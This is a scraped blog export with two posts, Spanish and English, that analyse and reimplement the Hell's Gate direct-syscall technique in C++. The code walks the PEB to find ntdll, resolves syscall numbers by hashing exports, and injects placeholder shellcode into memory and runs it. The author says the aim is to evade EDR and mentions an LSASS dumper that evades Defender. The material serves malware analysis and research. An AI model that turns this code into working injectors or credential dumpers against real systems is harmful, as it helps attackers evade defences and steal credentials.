pEntry = pEntry-\u0026gt;Flink) { /* If I understood correctly we must subtract 16 from the ntdll.dll entry in the InMemoryModuleList. This is neccessary because the Flink is not the first member of the LDR_DATA_TABLE_ENTRY structure, so when subtracting 0x10 we get the start of the structure for ntdll.dll */ pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)((std::int64_t)pEntry-0x10); /* Calculate a hash for the given DLL name */ dwDllNameSize = (pLdrDataTableEntry-\u0026gt;BaseDllName.Length) / sizeof(wchar_t); dwRorOperations = 0x00; dwModuleHash = 0x00; /* Hash the DLL name for identification */ for (int i = 0; i \u0026lt; dwDllNameSize; i++) { dwModuleHash = dwModuleHash + ((uint32_t)pLdrDataTableEntry-\u0026gt;BaseDllName.Buffer[i]); if (dwRorOperations \u0026lt; (dwDllNameSize - 1)) { dwModuleHash = _rotr(dwModuleHash, 0xd); } dwRorOperations++; } std::wprintf(L\u0026#34;[*] Found %ws (HASH: 0x%lx, ENTRY: 0x%lx)\\n\u0026#34;, pLdrDataTableEntry-\u0026gt;BaseDllName.Buffer, dwModuleHash, (std::int64_t)pLdrDataTableEntry); if (dwModuleHash == NTDLL_HASH) { std::wprintf(L\u0026#34;[+] Located ntdll: 0x%x\\n\u0026#34;, pLdrDataTableEntry); break; } } return pLdrDataTableEntry; } Obtener la tabla de direcciones de exportación (EAT) para NTDLL # El paso que sigue es obtener la tabla de dirección de exportación de NTDLL.\nPIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL; if (!GetImageExportDirectory(pLdrDataEntry-\u0026gt;DllBase, \u0026amp;pImageExportDirectory) || pImageExportDirectory == NULL) return 0x01; Mirando el código, esta función fue creada por el autor de la Puerta del Infierno, vamos a mirar ese código.\nBOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) { // Get DOS header PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase; if (pImageDosHeader-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) { return FALSE; } // Get NT headers PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-\u0026gt;e_lfanew); if (pImageNtHeaders-\u0026gt;Signature != IMAGE_NT_SIGNATURE) { return FALSE; } // Get the EAT *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress); return TRUE; } Veamos esto en WinDbg.\nUna vez que hayamos obtenido el DataDirectory podemos conseguir la dirección virtual de la tabla de dirección de exportación desde el primer índice dentro del DataDirectory. Podemos confirmar esto con !dh ntdll.dll -f.\nReimplementemos esto rápidamente:\nVOID GetExportAddressTable(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) { PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase; PIMAGE_NT_HEADERS pImageNtHeaders = NULL; /* Verify that the DOS header is valid */ if (pImageDosHeader-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) { std::wcout \u0026lt;\u0026lt; L\u0026#34;[-] Failed to detect DOS header\\n\u0026#34;; return; } /* Get a pointer to the IMAGE_NT_HEADER structure of the module (ntdll.dll) */ pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-\u0026gt;e_lfanew); if (pImageNtHeaders-\u0026gt;Signature != IMAGE_NT_SIGNATURE) { std::wcout \u0026lt;\u0026lt; L\u0026#34;[-] Failed to obtain pointer to IMAGE_NT_HEADERS\\n\u0026#34;; return; } /* Obtain the address of the EAT */ *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress); return; } Obteniendo Entendimiento de GetVxTableEntry() # El siguiente paso que vemos es una declaración de una estructura VX_TABLE junto con una llamada a la función GetVxTableEntry().\nVX_TABLE Table = { 0 }; Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b; if (!GetVxTableEntry(pLdrDataEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;Table.NtAllocateVirtualMemory)) return 0x1; Analicemos la función GetVxTableEntry(). Estas tres primeras líneas:\nBOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) { PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfFunctions); PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfNames); PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfNameOrdinals); Lamentablemente este código no está disponible gratuitamente. Por suerte, pude encontrar la definición de la estructura en ReactOS y malware.in. Usando esto podemos verificar manualmente que esto sea cierto usando WinDbg.\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; PDWORD *AddressOfFunctions; PDWORD *AddressOfNames; PWORD *AddressOfNameOrdinals; } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; Usando esta estructura podemos comenzar a mapear cómo se usa exactamente esta estructura adentro del código maligno.\nLas líneas que siguen tienen un bucle interesante.\nfor (WORD cx = 0; cx \u0026lt; pImageExportDirectory-\u0026gt;NumberOfNames; cx++) { PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]); PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]]; if (djb2(pczFunctionName) == pVxTableEntry-\u0026gt;dwHash) { pVxTableEntry-\u0026gt;pAddress = pFunctionAddress; // Quick and dirty fix in case the function has been hooked WORD cw = 0; while (TRUE) { // check if syscall, in this case we are too far if (*((PBYTE)pFunctionAddress + cw) == 0x0f \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05) return FALSE; // check if ret, in this case we are also probaly too far if (*((PBYTE)pFunctionAddress + cw) == 0xc3) return FALSE; // First opcodes should be : // MOV R10, RCX // MOV RCX, \u0026lt;syscall\u0026gt; if (*((PBYTE)pFunctionAddress + cw) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) { BYTE high = *((PBYTE)pFunctionAddress + 5 + cw); BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low; break; } cw++; }; } } En breve:\nPrimero, vemos que estamos iterando sobre el número de nombres en el IMAGE_EXPORT_DIRECTORY (for (WORD cx = 0; cx \u0026lt; pImageExportDirectory-\u0026gt;NumberOfNames; cx++) {) Luego, iteramos sobre cada nombre de función tal como vimos en WinDBG PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]); Por último, obtenemos la dirección de la función como se vio en el código pasado PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]]; Si reimplementamos esto en nuestro código veremos esto:\nLa siguiente línea es una if condición. Curiosamente, vemos la introducción de una nueva función djb2().\nif (djb2(pczFunctionName) == pVxTableEntry-\u0026gt;dwHash) { Además, volvemos a ver nuestro dwHash. Desde mi punto de vista esto no parece ser necesario. Podemos usar cualquier función para crear la hash\u0026hellip; pero por ahora dejaremos la función como está diseñada.\nEl bloque de código que sigue tiene un tamaño decente, vemos algunas verificaciones y finalmente buscamos códigos de operación 0x4c, 0x8bx 0xd1, 0xb8, 0x00, and 0x00.\npVxTableEntry-\u0026gt;pAddress = pFunctionAddress; // Quick and dirty fix in case the function has been hooked WORD cw = 0; while (TRUE) { // check if syscall, in this case we are too far if (*((PBYTE)pFunctionAddress + cw) == 0x0f \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05) return FALSE; // check if ret, in this case we are also probaly too far if (*((PBYTE)pFunctionAddress + cw) == 0xc3) return FALSE; // First opcodes should be : // MOV R10, RCX // MOV RCX, \u0026lt;syscall\u0026gt; if (*((PBYTE)pFunctionAddress + cw) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) { BYTE high = *((PBYTE)pFunctionAddress + 5 + cw); BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low; break; } cw++; Si miramos esto con mi herramienta sickle vemos que esto si es mov r10, rcx. Sin embargo, por el resultado, es posible que podamos simplemente usar 0x4c, 0x8b, and 0xd1.\n┌──(wetw0rk㉿kali)-[/opt/Sickle/src] └─$ python3 sickle.py -m asm_shell -f c [*] ASM Shell loaded for x64 architecture sickle \u0026gt; d 4c8bd1b80000 4c8bd1 -\u0026gt; mov r10, rcx Si actualizamos el código una vez más\nBOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) { PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfFunctions); PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfNames); PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfNameOrdinals); WORD cx = 0x00; WORD cw = 0x00; PCHAR pczFunctionName = NULL; PVOID pFunctionAddress = NULL; for (cx = 0; cx \u0026lt; pImageExportDirectory-\u0026gt;NumberOfNames; cx++) { pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]); pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]]; /* We found the target function */ if (djb2((PBYTE)pczFunctionName) == pVxTableEntry-\u0026gt;dwHash) { pVxTableEntry-\u0026gt;pAddress = pFunctionAddress; while (TRUE) { printf(\u0026#34;[*] Found target function: %s (0x%p)\\n\u0026#34;, pczFunctionName, pFunctionAddress); if (*((PBYTE)pFunctionAddress + cw) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) { printf(\u0026#34;[+] Syscall found @{0x%p}\\n\u0026#34;, (PVOID)((intptr_t)pFunctionAddress + cw)); getchar(); } cw++; } } } return TRUE; } Nosotras podemos ver que la llamada del sistema fue encontrado.\nVemos que si ubicamos la secuencia de bytes/instrucciones escribimos la lamada del sistema en la estructura VX_TABLE.\nBYTE high = *((PBYTE)pFunctionAddress + 5 + cw); BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low; No estoy seguro de por qué debemos meter lo así, pero en WinDBG podemos ver que cuando leemos este valor es sencillo.\nAhora hemos implementado nuestra propia versión de esta función para comprender sus operaciones subyacentes.\nBOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) { PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfFunctions); PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfNames); PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfNameOrdinals); BYTE high = 0x00; BYTE low = 0x00; WORD cx = 0x00; WORD cw = 0x00; PCHAR pczFunctionName = NULL; PVOID pFunctionAddress = NULL; for (cx = 0; cx \u0026lt; pImageExportDirectory-\u0026gt;NumberOfNames; cx++) { pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]); pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]]; /* We found the target function */ if (djb2((PBYTE)pczFunctionName) == pVxTableEntry-\u0026gt;dwHash) { pVxTableEntry-\u0026gt;pAddress = pFunctionAddress; /* Quick and dirty fix in case the function has been hooked */ while (TRUE) { /* Check if a syscall instruction has been reached, if so we are too deep into the function */ if (*((PBYTE)pFunctionAddress + cw) == 0x0f \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05) return FALSE; /* Check if a ret instruction has been reached, if so we read to deep into the function */ if (*((PBYTE)pFunctionAddress + cw) == 0xc3) return FALSE; if (*((PBYTE)pFunctionAddress + cw) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) { high = *((PBYTE)pFunctionAddress + 5 + cw); low = *((PBYTE)pFunctionAddress + 4 + cw); pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low; printf(\u0026#34;[*] %s syscall start found @{0x%p}\\n\u0026#34;, pczFunctionName, (PVOID)((intptr_t)pFunctionAddress + cw)); printf(\u0026#34;\\t[*] High: 0x%x\\n\u0026#34;, high); printf(\u0026#34;\\t[*] Low: 0x%x\\n\u0026#34;, low); printf(\u0026#34;\\t[*] Syscall: 0x%x\\n\u0026#34;, pVxTableEntry-\u0026gt;wSystemCall); break; } cw++; } } } return TRUE; } Con eso podemos introducir el resto de la función main().\nvxTable.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b; if (!GetVxTableEntry(pNtdllEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;vxTable.NtAllocateVirtualMemory)) return 0x01; vxTable.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f; if (!GetVxTableEntry(pNtdllEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;vxTable.NtCreateThreadEx)) return 0x1; vxTable.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37; if (!GetVxTableEntry(pNtdllEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;vxTable.NtProtectVirtualMemory)) return 0x1; vxTable.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb; if (!GetVxTableEntry(pNtdllEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;vxTable.NtWaitForSingleObject)) return 0x1; Obteniendo Entendimiento de Payload() # Ahora estamos en la llamada final de la función main().\nPayload(\u0026amp;Table); Una vez más, esta funciones es implementa por el autor. Sin embargo, vemos tres funciones más interesantes: HellsGate, HellsDescent, and VxMoveMemory.\nBOOL Payload(PVX_TABLE pVxTable) { NTSTATUS status = 0x00000000; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\xcc\\xcc\\xcc\\xcc\\xc3\u0026#34;; // Allocate memory for the shellcode PVOID lpAddress = NULL; SIZE_T sDataSize = sizeof(shellcode); HellsGate(pVxTable-\u0026gt;NtAllocateVirtualMemory.wSystemCall); status = HellDescent((HANDLE)-1, \u0026amp;lpAddress, 0, \u0026amp;sDataSize, MEM_COMMIT, PAGE_READWRITE); // Write Memory VxMoveMemory(lpAddress, shellcode, sizeof(shellcode)); // Change page permissions ULONG ulOldProtect = 0; HellsGate(pVxTable-\u0026gt;NtProtectVirtualMemory.wSystemCall); status = HellDescent((HANDLE)-1, \u0026amp;lpAddress, \u0026amp;sDataSize, PAGE_EXECUTE_READ, \u0026amp;ulOldProtect); // Create thread HANDLE hHostThread = INVALID_HANDLE_VALUE; HellsGate(pVxTable-\u0026gt;NtCreateThreadEx.wSystemCall); status = HellDescent(\u0026amp;hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL); // Wait for 1 seconds LARGE_INTEGER Timeout; Timeout.QuadPart = -10000000; HellsGate(pVxTable-\u0026gt;NtWaitForSingleObject.wSystemCall); status = HellDescent(hHostThread, FALSE, \u0026amp;Timeout); return TRUE; } Obteniendo Entendimiento de HellsGate # Podemos seguir adelante e ignorar la operación de VxMoveMemory - esto es solo una implementación personalizada de memcpy() creado por el autor. Sin embargo, podemos empezar a comprender las operaciones de la primera llamada - HellsGate.\n.data wSystemCall DWORD 000h .code HellsGate PROC mov wSystemCall, 000h mov wSystemCall, ecx ret HellsGate ENDP Coloquemos una DebugBreak(); antes de esta llamada.\nDebugBreak(); HellsGate(pVxTable-\u0026gt;NtAllocateVirtualMemory.wSystemCall); Una vez corriendo en WinDBG, podemos ver que estamos a punto de ingresar a la llamada a HellsGate.\nUna vez que estemos a dentro, podremos ver que ejecutaremos las llamadas al sistema que resolvimos dinámicamente.\nObteniendo Entendimiento de HellsDescent # At this point our assembler holds the number call of the system para NtAllocateVirtualMemory dentro de la sección .data del binario. El siguiente paso es llamar HellsDescent, aquí es donde ejecutamos la llamada del sistema.\nstatus = HellDescent((HANDLE)-1, \u0026amp;lpAddress, 0, \u0026amp;sDataSize, MEM_COMMIT, PAGE_READWRITE); Cuando lleguemos a HellsDescent podemos ver que estamos moviendo RCX a R10. Normalmente, al emitir una llamada a una función, los argumentos se envían en el orden RCX, RDX, R8, R9 cualquier argumento adicional se coloca en el stack a una distancia de 0x20. Si miramos el prototipo de la función NtAllocateMemory() rápidamente vemos que todos estos argumentos simplemente no se pueden almacenar dentro de RCX a menos que RCX sea un puntero a un objeto.\n__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory( [in] HANDLE ProcessHandle, [in, out] PVOID *BaseAddress, [in] ULONG_PTR ZeroBits, [in, out] PSIZE_T RegionSize, [in] ULONG AllocationType, [in] ULONG Protect ); Esto se confirma además al deshacerse de los estados de registro.\nEn este punto tenemos un conocimiento sólido de cómo HellsGate opera :)\nLea el InMemoryOrderModuleList y obtener la dirección base de NTDLL Obtener la dirección del EAT for NTDLL Lea la EAT buscando llamadas del sistema Ejecutar llamadas del sistema. Ganancia PoC | VALM - (Tronos de Ezequiel) # Hemos aprendido el funcionamiento interno de la Puerta del Infierno, es importante saber que esto no habría sido posible sin el conocimiento fundamental de la llamada al sistema.\nLos cambios que he implementado son los siguientes\nLas llamadas al sistema se generan dinámicamente. Reutilización de código, vivimos de la tierra y aprovechamos ntdll.dll para realizar llamadas al sistema por nosotros. Esto hace que las operaciones parezcan normales evadiendo EDR. Hemos vuelto a implementar nuestra propia técnica de hash para el descubrimiento de rutinas de funciones. Le dimos un nombre que es fuerte. Ezequiel 10:10: En cuanto a su apariencia, las cuatro tenían la misma semejanza, como si una rueda estuviera dentro de la otra rueda.\nRecursos # http://malwareid.in/unpack/unpacking-basics/export-address-table-and-dll-hijacking https://doxygen.reactos.org/de/d20/struct__IMAGE__EXPORT__DIRECTORY.html https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-containing_record https://davidesnotes.com/articles/1/?page=1# https://gist.github.com/Spl3en/9c0ea329bb7878df9b9b https://redops.at/en/blog/exploring-hells-gate http://www.rohitab.com/discuss/topic/42191-c-peb-ldr-inmemoryordermodulelist-flink-dllbase-dont-get-the-good-address/ https://www.vergiliusproject.com/ https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/ https://www.youtube.com/watch?v=elA_eiqWefw\u0026amp;t=2s ","date":"24 November 2024","externalUrl":null,"permalink":"/posts/tronos/","section":"Posts","summary":"","title":"La Rueda de Ezequiel (Análisis de la Puerta del Infierno)","type":"posts"},{"content":"The following writeup is a my analysis of the Hells Gate malware. This malware strain contains a technique that performs syscalls on the Windows operating system in order to evade EDR detection.\nUpon completion of my analysis, I developed my own implementation in C++ that uses existing syscall instructions within ntdll.dll and a custom hashing technique to evade the modern methods of detection for these types of techniques.\nThere are further optimizations that can be added to the technique, however for the sake of time, two PoC\u0026rsquo;s were developed.\nIn the year 2024, a basic shellcode injector that evades modern EDR In 2024 an LSSAS dumper that evades Windows Defender. The LSASS dumper may be optimized to evade EDR however I leave this as an exercise to the reader.\nTable of Contents # Disclaimer Understanding The Malware Get NTDLL Module Entry Getting the Export Address Table (EAT) of NTDLL Understanding GetVxTableEntry() Understanding Payload() Understanding HellsGate Understanding HellsDescent PoC | GTFO (Ezekiels Wheel) Sources Disclaimer # Copyright 2024 Milton Valencia\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\nUnderstanding The Malware # So I downloaded the source code for this technique from am0nsec. I wanted to break down this code line-by-line starting with the main function.\nINT wmain() { PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock(); PPEB pCurrentPeb = pCurrentTeb-\u0026gt;ProcessEnvironmentBlock; if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-\u0026gt;OSMajorVersion != 0xA) return 0x1; // Get NTDLL module PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-\u0026gt;LoaderData-\u0026gt;InMemoryOrderModuleList.Flink-\u0026gt;Flink - 0x10); // Get the EAT of NTDLL PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL; if (!GetImageExportDirectory(pLdrDataEntry-\u0026gt;DllBase, \u0026amp;pImageExportDirectory) || pImageExportDirectory == NULL) return 0x01; VX_TABLE Table = { 0 }; Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b; if (!GetVxTableEntry(pLdrDataEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;Table.NtAllocateVirtualMemory)) return 0x1; Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f; if (!GetVxTableEntry(pLdrDataEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;Table.NtCreateThreadEx)) return 0x1; Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37; if (!GetVxTableEntry(pLdrDataEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;Table.NtProtectVirtualMemory)) return 0x1; Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb; if (!GetVxTableEntry(pLdrDataEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;Table.NtWaitForSingleObject)) return 0x1; Payload(\u0026amp;Table); return 0x00; } So it looks like the first step is to \u0026ldquo;Get NTDLL\u0026rdquo;.\nGet NTDLL Module Entry # To get a better understanding of how this was achieved I used the following PoC:\nint main() { PTEB pTeb = GetThreadEnvironmentBlock(); PPEB pPeb = pTeb-\u0026gt;ProcessEnvironmentBlock; std::cout \u0026lt;\u0026lt; \u0026#34;[*] Testing on OS Version: \u0026#34; \u0026lt;\u0026lt; pPeb-\u0026gt;OSMajorVersion \u0026lt;\u0026lt; std::endl; PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPEB-\u0026gt;LoaderData-\u0026gt;InMemoryOrderModuleList.Flink - 0x10); std::cout \u0026lt;\u0026lt; \u0026#34;[*] pLdrDataEntry: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; (uint64_t)pLdrDataEntry \u0026lt;\u0026lt; std::endl; getchar(); return 0; } For the sake of brevity structures will only be brought up when relevant. Once ran, we see the following output but what is this?\nC:\\Users\\developer\\Desktop\u0026gt;hg.exe [*] Testing on OS Version: 10 [*] pLdrDataEntry: 0x26f94d06020 If we break into WinDbg, we can get to the PEB using !process 0 0 hg.exe. The main thing we want to look at here is the InMemoryOrderModuleList.\nWe can see that this is very similar to our output and if we subtract 0x10 from this address it\u0026rsquo;s exactly the same.\nAt first glance, this does not tell us much. However, each list entry is actually wrapped in a LDR_DATA_TABLE_ENTRY. So, we can get more context by dumping the structure itself located in the FLINK pointer.\nIn the output above we can see that this is in fact the entry to the NTDLL module. The steps are basically as follows in this line of code:\nUse the GS register to get a pointer to the TEB The TEB contains a pointer to the PEB Use the PEB to get a pointer to the PEB_LDR_DATA structure Using the PEB_LDR_DATA structure we can get to the InMemoryOrderModuleList Let\u0026rsquo;s implement a PoC to traverse this using doubly-linked list using our new found knowledge. Since we have no guarantee that ntdll.dll will always be loaded at offset -0x10.\nint main() { PTEB pTeb = NULL; PPEB pPeb = NULL; PLIST_ENTRY pEntry = NULL; PLIST_ENTRY pHeadEntry = NULL; PPEB_LDR_DATA pLdrData = NULL; PLDR_DATA_TABLE_ENTRY pLdrEntry = NULL; PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = NULL; /* Get the TEB */ pTeb = GetThreadEnvironmentBlock(); /* Get the PEB */ pPeb = pTeb-\u0026gt;ProcessEnvironmentBlock; /* OS Version Detection Omitted */ std::cout \u0026lt;\u0026lt; \u0026#34;[*] Testing on OS Version: \u0026#34; \u0026lt;\u0026lt; pPeb-\u0026gt;OSMajorVersion \u0026lt;\u0026lt; std::endl; /* Obtain a pointer to the structure that contains information about the loaded modules for a given process */ pLdrData = pPeb-\u0026gt;LoaderData; /* Get the pointer to the InMemoryOrderModuleList which is a doubly-linked list that contains the loaded modules for the process */ pHeadEntry = \u0026amp;pLdrData-\u0026gt;InMemoryOrderModuleList; /* Iterate over the InMemoryOrderModuleList */ std::wcout \u0026lt;\u0026lt; L\u0026#34;\\nInMemoryOrderModuleList\\n\u0026#34; \u0026lt;\u0026lt; std::endl; std::wcout \u0026lt;\u0026lt; L\u0026#34;\\tBase\\t\\t\\tModule\\n\u0026#34; \u0026lt;\u0026lt; std::endl; for (pEntry = pHeadEntry-\u0026gt;Flink; pEntry != pHeadEntry; pEntry = pEntry-\u0026gt;Flink) { pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pEntry; std::wcout \u0026lt;\u0026lt; L\u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; pLdrDataTableEntry-\u0026gt;DllBase \u0026lt;\u0026lt; L\u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; pLdrDataTableEntry-\u0026gt;FullDllName.Buffer \u0026lt;\u0026lt; std::endl; } getchar(); return 0; } Nice we can see that our PoC works:\nHowever, we still need to get it to return the original value from the PoC which is a pointer to the LIST_ENTRY. So, let\u0026rsquo;s modify our code once more, creating a single function to obtain the entry dynamically.\nWhen writing this I observed that the last PoC (we wrote) was incorrect for properly parsing each entry. To properly reach an LDR_DATA_TABLE_ENTRY, we must subtract 0x10 from the module found since the Flink address IS NOT the first member of the structure.\nPLDR_DATA_TABLE_ENTRY GetNtdllTableEntry() { PTEB pTeb = NULL; PPEB pPeb = NULL; DWORD dwModuleHash = 0x00; DWORD dwDllNameSize = 0x00; DWORD dwRorOperations = 0x00; PLIST_ENTRY pEntry = NULL; PLIST_ENTRY pHeadEntry = NULL; PPEB_LDR_DATA pLdrData = NULL; PLDR_DATA_TABLE_ENTRY pLdrEntry = NULL; PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = NULL; /* Get the TEB */ pTeb = GetThreadEnvironmentBlock(); /* Get the PEB */ pPeb = pTeb-\u0026gt;ProcessEnvironmentBlock; /* Obtain a pointer to the structure that contains information about the loaded modules for a given process */ pLdrData = pPeb-\u0026gt;LoaderData; /* Get the pointer to the InMemoryOrderModuleList which is a doubly-linked list that contains the loaded modules for the process */ pHeadEntry = \u0026amp;pLdrData-\u0026gt;InMemoryOrderModuleList; /* Iterate over the InMemoryOrderModuleList 